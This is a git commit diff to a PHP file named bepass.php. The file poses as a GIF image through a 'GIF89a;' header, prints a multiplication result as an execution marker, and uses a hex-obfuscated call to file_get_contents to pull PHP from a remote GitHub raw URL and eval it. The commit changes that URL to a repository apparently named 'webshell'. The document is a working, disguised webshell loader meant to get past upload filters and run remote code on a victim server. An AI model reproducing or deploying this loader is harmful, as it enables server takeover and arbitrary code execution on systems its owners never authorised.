70915e683df81149043f1a8b859b3c938933ca3c
AzhariKun <76898637+AzhariKun@users.noreply.github.com>
2023-10-03 13:23:35 +0700

    w

--- bepass.php
+++ bepass.php
@@ -1,3 +1,3 @@
 GIF89a;
 
-<?=62637*77373;$_AB = "https://raw.githubusercontent.com/Jenderal92/KC5/master/shin.php";$_B = "\x46\x49\x4c\x45\x5f\x47\x45\x54\x5f\x43\x4f\x4e\x54\x45\x4e\x54\x53"; eVAL("?>".$_B($_AB));
+<?=62637*77373;$_AB = "https://raw.githubusercontent.com/AzhariKun/webshell/main/gekkon.php";$_B = "\x46\x49\x4c\x45\x5f\x47\x45\x54\x5f\x43\x4f\x4e\x54\x45\x4e\x54\x53"; eVAL("?>".$_B($_AB));
